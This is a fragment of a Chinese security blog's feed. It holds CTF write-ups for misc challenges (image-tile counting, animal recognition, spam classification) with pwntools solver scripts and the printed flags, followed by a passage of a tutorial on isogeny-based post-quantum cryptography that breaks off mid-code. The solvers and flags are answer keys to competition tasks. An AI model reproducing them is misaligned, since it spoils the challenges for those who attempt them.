class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">20382</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">sample = [<span class="string">&#x27;d108ad1582e37a825d092131a55babcc&#x27;</span>, <span class="string">&#x27;9901603c7d2a5dde25723c9e569428da&#x27;</span>, <span class="string">&#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;</span>, <span class="string">&#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;</span>, <span class="string">&#x27;33ff92480ee08585d901ffd0a47de021&#x27;</span>, <span class="string">&#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;</span>, <span class="string">&#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;</span>, <span class="string">&#x27;4497c04cea4897727d88f7945bc86d77&#x27;</span>, <span class="string">&#x27;047fd19a9a30301444e11394ee99d8be&#x27;</span>, <span class="string">&#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;</span>, <span class="string">&#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;</span>, <span class="string">&#x27;109d33cf832c83ebebca8c4f165862a9&#x27;</span>, <span class="string">&#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;</span>, <span class="string">&#x27;121808a4d3f160f235f27cb77355d525&#x27;</span>, <span class="string">&#x27;b15356da578f67bac5a3d777913ce97d&#x27;</span>, <span class="string">&#x27;a174639d2070109e85ffb53657d5c9d5&#x27;</span>, <span class="string">&#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;</span>, <span class="string">&#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;</span>, <span class="string">&#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;</span>, <span class="string">&#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;</span>, <span class="string">&#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;</span>, <span class="string">&#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;</span>, <span class="string">&#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;</span>, <span class="string">&#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;</span>, <span class="string">&#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;</span>, <span class="string">&#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    x = md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest()</span><br><span class="line">    m.append(x)</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    out.append(res[sample[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(out).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Got it!</span><br><span class="line">flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h3><p>给定动物样本数据，判断随机抽取10次动物图片，输入动物名称，正确至少8次给flag，每次3s内输入。</p><p>数量较少，非预期直接按照图片手动判断在3s内快速输入即可。</p><p>半自动交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">28452</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>)</span><br><span class="line">    img.show()</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(raw_input(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h3><p>提供50封邮件内容的正常邮件/垃圾邮件分类，判断10封邮件内容属于哪种分类，全对给flag。</p><p>数量较少，非预期直接按照内容手动判断即可。</p><p>PoW部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">27218</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;sha256(&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">28</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;= &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;xxxx = &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">51</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Press ENTER to continue... &#x27;</span>)</span><br><span class="line">    r.sendline()</span><br><span class="line">    </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>按内容手动判断输入H（正常邮件）或S（垃圾邮件），得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good job! Just take it:</span><br><span class="line">flag&#123;da238e5ee5716136c6884c0b4a369093&#125;</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;✌️竞赛时间：12月17日 10:00—12月18日 22:00&lt;br&gt;✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。&lt;br&gt;✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>后量子密码</title>
    <link href="https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    <id>https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</id>
    <published>2022-12-16T14:04:27.000Z</published>
    <updated>2024-03-16T14:24:00.903Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p><strong>后量子密码学</strong>（Post-Quantum Cryptography，PQC），又称<strong>抗量子计算密码学</strong>，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对称加密）算法。不同于量子密码学，后量子密码学使用现有的电子计算机，不依靠量子力学，它依靠的是密码学家认为无法被量子计算机有效解决的计算难题。</p><p>在公钥加密方面，后量子密码学的研究方向包括了格密码学（Lattice-based Cryptography）、容错学习问题（LWE）、多变量密码学（英语：Multivariate Cryptography）、散列密码学（英语：Hash-based Cryptography）、编码密码学（Code-based Cryptography）与超奇异椭圆曲线同源密码学（Supersingular Isogeny Key Exchange）。密码学家认为，基于这些计算难题有望构建出不受量子计算机的威胁的公钥加密系统，替代现有的方案。</p><p>​    </p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="超奇异椭圆曲线"><a href="#超奇异椭圆曲线" class="headerlink" title="超奇异椭圆曲线"></a>超奇异椭圆曲线</h4><p>若曲线 $E$ 定义在有限域 $F_{p^r} (r \in \Z^*)$ 下，若 $E$ 的阶 $\text{order}$ 满足 $\text{order} = 1 \pmod p$，则$E$ 是一条超奇异椭圆曲线 (Supersigular Elliptic Curve)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">2</span>^<span class="number">4</span>*<span class="number">3</span>^<span class="number">3</span>-<span class="number">1</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">208</span>*i + <span class="number">161</span></span><br><span class="line">Ea = EllipticCurve(F,[<span class="number">0</span>,a,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(Ea.order() % p , Ea.is_supersingular())</span><br></pre></td></tr></table></figure><h4 id="j不变量（j-invariant）"><a href="#j不变量（j-invariant）" class="headerlink" title="j不变量（j-invariant）"></a>j不变量（j-invariant）</h4><p>对于椭圆曲线来说，j不变量可以简单理解为一个判定两条椭圆曲线是否同构的值。也就是说，任何一个曲线都有自己独特的j不变量，而如果两条曲线的j不变量相等，则说明这两条曲线彼此同构。而由于同构的曲线本质上都可以看作同一条曲线，这也就说明，一个j不变量其实在同构意义上其实就唯一对应着一条曲线。</p><p>j不变量相同意味着，可以找到一个同构，将一条曲线映射到另一条曲线上。</p><p>二次扩域 $F_{p^2}$ 下共有 $p^2$ 个j不变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">2</span>^<span class="number">4</span>*<span class="number">3</span>^<span class="number">3</span>-<span class="number">1</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">208</span>*i + <span class="number">161</span></span><br><span class="line">Ea = EllipticCurve(F,[<span class="number">0</span>,a,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line">j = Ea1.j_invariant()</span><br></pre></td></tr></table></figure><h4 id="同源（isogeny）"><a href="#同源（isogeny）" class="headerlink" title="同源（isogeny）"></a>同源（isogeny）</h4><p>一个可分的(separable)同源可以描述为：对于一条曲线 $E$ 以及 $E$ 上一个子群 $G$，都可以构造一个以 $G$ 为核的映射 $\phi: E \rightarrow E’$，这个映射就是同源，映射到的曲线 $E’$​ 就叫做这个同源的陪域(codomain)。</p><p>可以用这个子群 $G$ 和曲线 $E$ 生成一个同源，映射到的曲线 $E’$ 不再是原来的曲线E了，它的j不变量发生了变化。可以用如下方式求出曲线上所有阶为2的点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torsion_2_points = E(<span class="number">0</span>).division_points(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(torsion_2_points)</span><br></pre></td></tr></table></figure><h4 id="同源图"><a href="#同源图" class="headerlink" title="同源图"></a>同源图</h4><p>二次扩域 $F_{p^2}$ 下所有超奇异椭圆曲线的j不变量的图，对所有点的 $n$-torsion都画出这些边，就得到了完整的 $n$-isogeny 的同源图，能表示出这个二次扩域中所有度为 $n$​ 的 isogeny 的映射关系。</p><p>之所以边是无向的，就是因为有对偶映射，如果 $E$ 向 $E’$ 有个度为 $n$ 的同源，那么 $E’$ 向 $E$ 也一定有一个度为 $n$​ 的对偶同源。</p><h4 id="模多项式（modular-polynomial）"><a href="#模多项式（modular-polynomial）" class="headerlink" title="模多项式（modular polynomial）"></a>模多项式（modular polynomial）</h4><p>用一个多项式关联了 $d$​​-isogeny 中互为邻居的两个j不变量。如果知道了一个j不变量，那么可以将其代入对应度的modular polynomial去求根，得到的所有根就是所有作为他的邻居的j不变量。</p><p>modular polynomial对应的度较低的多项式形式参考：<a href="https://math.mit.edu/~drew/ClassicalModPolys.html">Modular polynomials (mit.edu)</a></p><p>参考：</p><p><a href="https://tangcuxiaojikuai.xyz/post/e06139e7.html">Isogeny</a></p><p>​    </p><h3 id="超奇异同源密钥交换（SIDH）"><a href="#超奇异同源密钥交换（SIDH）" class="headerlink" title="超奇异同源密钥交换（SIDH）"></a>超奇异同源密钥交换（SIDH）</h3><p>超奇异椭圆曲线同源密码学（Supersingular Elliptic Curve Isogeny Cryptography）是利用超奇异椭圆曲线（Supersingular Elliptic Curves）与超奇异同源图（Supersingular Isogeny Graphs）的数学性质的密码学，可以实现<strong>超奇异同源密钥交换</strong>（Supersingular Isogeny Key Exchange，<strong>SIKE</strong>）（协议为超奇异同源Diffie-Hellman密钥交换协议，<strong>SIDH</strong>），具有前向安全性。其使用方法和现有的Diffie-Hellman密钥交换相似，有望直接替代当前的常规椭圆曲线密钥交换（ECDH）。</p><p>Diffie-Hellman基本协议：</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH0.jpeg" alt="img"></p><p>抽象Diffie-Hellman：</p><p>Alice的秘密是 $a$，她的计算先做→，得到 $g^a$，再做↓，得到 $g^{ab}$。而Bob的秘密是 $b$，他先做↓，再做→。殊途同归得到 $g^{ab}$。</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH1.jpeg" alt="img"></p><h4 id="SIDH构造的简化版本"><a href="#SIDH构造的简化版本" class="headerlink" title="SIDH构造的简化版本"></a>SIDH构造的简化版本</h4><p>SIDH的基本代数结构是超奇异椭圆曲线群 $E$ 和超奇异同源（Isogeny）$\phi$。基本思路如下图所示：</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-2.jpeg" alt="img" style="zoom: 67%;"></p><p>首先，超奇异椭圆曲线群 $E$ 理解为一个群。其次，构造用到的超奇异同源 $\phi : E \mapsto E’$ 是从群 $E$ 到群 $E’$ 的一种群同态。算法类似DH算法分为以下两个步骤：</p><ul><li>首先，Alice选取一个点 $R_A \in E$，$\langle R_A \rangle$ 确定了群 $E$ 的一个子群，然后可以计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\phi_A: E \mapsto E_A$，这是Alice的秘密信息。Alice发送公开信息 $E_A$ 给Bob。</li><li>同样，Bob选择点 $R_B\in E$，然后计算得到 $\phi_B: E \mapsto E_B$，把公开信息 $E_B$ 发送给Alice。</li></ul><p>最终Alice算出 $E/\langle R_B, R_A \rangle$，Bob算出 $E/\langle R_A, R_B \rangle$。上图中的 $E/\langle R_A \rangle$ 和 $E/\langle R_B \rangle$ 分别是 $E_A$ 和 $E_B$，这样表达是为了与之前的表达一致，其实这里并不是做商群，而是表达说 $\phi_A$ 的Kernel是 $\langle R_A \rangle$。目前的科技文献大多使用这种表达。</p><p>上面说到，$E_A$ 是曲线群 $E$ 的子群，它由同源 $\phi_A$ 决定，可理解为群同态 $\phi_A$ 映射到 $E$ 上的像 (Image)形成的子群。同理，$E_{BA}$ 是同源 $\phi_{BA}$ 映射到 $E$ 上的子群，而同源 $\phi_{BA}$ 是由 $\langle R_B, R_A \rangle$ 决定的，即同源 $\phi_{BA}$ 的Kernel是 $\langle R_B, R_A \rangle$。</p><h4 id="SIDH构造的细化版本"><a href="#SIDH构造的细化版本" class="headerlink" title="SIDH构造的细化版本"></a>SIDH构造的细化版本</h4><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-3.jpeg" alt="img" style="zoom:67%;"></p><p>为了满足Alice在没有Bob的秘密信息的情况下能计算出 $E_{BA}$ 的要求，SIDH需要使用更多的参数设计和相关计算。算法增加描述如下：</p><h5 id="SIDH参数设计"><a href="#SIDH参数设计" class="headerlink" title="SIDH参数设计"></a>SIDH参数设计</h5><p>首先，选择超奇异椭圆曲线 $E$ 作为公开参数。然后Alice随机选择两个元素 $P_A, Q_A \in E$，并公开作为自己的公共参数。同样，Bob也随机选择两个元素 $P_B, Q_B \in E$ 并公开。</p><h5 id="Alice的操作"><a href="#Alice的操作" class="headerlink" title="Alice的操作"></a>Alice的操作</h5><ul><li>随机选择两个整数 $s_A$ 和 $t_A$ 作为秘密信息，计算 $R_A = s_A P_A + t_A Q_A\in E$，并由 $R_A$ 计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\phi_A: E \mapsto E_A$，这也是Alice的秘密信息；</li><li>获取Bob的公开信息，并计算 $\phi_A(P_B)$ 和 $\phi_A(Q_B)$，这些是公开信息；</li><li>Alice发送公开信息 $E_A$、$\phi_A(P_B)$ 和 $\phi_A(Q_B)$ 给Bob。</li></ul><h5 id="Bob的操作"><a href="#Bob的操作" class="headerlink" title="Bob的操作"></a>Bob的操作</h5><ul><li>随机选择两个整数 $s_B$ 和 $t_B$ 作为秘密信息，计算 $R_B = s_B P_B + t_B Q_B\in E$，并由 $R_B$ 计算得到一个从 $E$ 映射到其子群 $E_B$ 的同源 $\phi_B: E \mapsto E_B$，这也是Bob的秘密信息；</li><li>获取Alice的公开信息，并计算 $\phi_B(P_A)$ 和 $\phi_B(Q_A)$，这些是公开信息；</li><li>Bob发送公开信息 $E_B$、$\phi_B(P_A)$ 和 $\phi_B(Q_A)$ 给Alice。</li></ul><h5 id="秘密值的计算"><a href="#秘密值的计算" class="headerlink" title="秘密值的计算"></a>秘密值的计算</h5><p>Alice计算子群 $E_{BA}$ ，方法如下：</p><ul><li>注意，此时Alice掌握的信息是 $s_A$、$t_A$、$R_A$、$\phi_B(P_A)$ 和 $\phi_B(Q_A)$，她想计算得到 $\phi_B(R_A)$。并且要强调，$\phi_B$ 是一种群同态。</li><li>利用群同态的属性可计算得到：$\phi_B(R_A) = \phi_B(s_A P_A + t_A Q_A) = s_A \phi_B(P_A) + t_A \phi_B(Q_A)$ 。</li><li>根据 $\phi_B(R_A)$ 计算 $E_{BA}$。$E_{BA}$是曲线群 $E$ 的子群，是以 $\phi_B (R_A)$ 为Kernel的群同态映射到 $E$ 上的子群。这个群同态也就是Isogeny，这个Isogeny记为 $\phi_{BA}$ 。</li></ul><p>类似的，Bob可以计算子群 $E_{AB}$：</p><ul><li>$\phi_A(R_B) = s_B \phi_A(P_B) + t_B \phi_A(Q_B)$；</li><li>由此可计算得 $E_{AB}$ ；</li></ul><p>最后冲顶的一步，计算秘密值。首先要明确，很可能 $E_{BA} \ne E_{AB}$，但是，$E_{BA}$ 同构于 $E_{AB}$。利用同构曲线的一个属性：所有同构曲线的J-Invariant值相同。于是Alice和Bob分别计算这两条曲线的J-Invariant值 $J(E_{BA})$ 和 $J(E_{AB})$，这就是他们共同拥有的秘密。J-Invariant的计算定义可在标准教科书中找到，本文把它视为黑盒子使用。</p><h4 id="Sage代码"><a href="#Sage代码" class="headerlink" title="Sage代码"></a>Sage代码</h4><p><strong>参数设置</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#选取一条在素域k上的超奇异椭圆曲线</span></span><br><span class="line">lA, lB = <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">eA, eB = <span class="number">6</span>, <span class="number">7</span></span><br><span class="line">p = lA ^ eA * lB ^ eB - <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p.is_prime()</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line">k = GF(p) <span class="comment"># 注意，这里并不是标准做法，只是因为Sage的局限不得已</span></span><br><span class="line">E = EllipticCurve(k, [<span class="number">1</span>, <span class="number">0</span>]) <span class="comment">#选取曲线</span></span><br><span class="line">E</span><br><span class="line">E.is_supersingular() <span class="comment"># 看看所生成的曲线是否超奇异.</span></span><br><span class="line"><span class="built_in">print</span>(E.j_invariant())</span><br><span class="line"></span><br><span class="line"><span class="comment">#选取四个随机点作为公共参数</span></span><br><span class="line">points = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(points) != <span class="number">4</span>:</span><br><span class="line">    p = E.random_point()</span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">not</span> <span class="keyword">in</span> points:</span><br><span class="line">        points.append(p)</span><br><span class="line">PA, PB, QA, QB = points</span><br><span class="line">PA, PB, QA, QB</span><br></pre></td></tr></table></figure><p><strong>Alice 的操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Alice选择两个随机数并计算自己的秘密值RA</span></span><br><span class="line"><span class="comment">#RA定义了phi_A的kernel</span></span><br><span class="line">sA, tA = <span class="number">123</span>, <span class="number">525</span></span><br><span class="line">RA = sA * PA + tA * QA</span><br><span class="line"><span class="built_in">print</span>(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiA就是同源也是群同态</span></span><br><span class="line">phiA = E.isogeny(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Alice的公共信息EA</span></span><br><span class="line">EA = phiA.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EA)) <span class="comment"># 确认EA与E同源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Alice发送以下信息给Bob</span></span><br><span class="line">EA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)</span><br><span class="line">EA, phiA_PB, phiA_QB</span><br></pre></td></tr></table></figure><p><strong>Bob 的操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Bob的工作类似</span></span><br><span class="line">sB, tB = <span 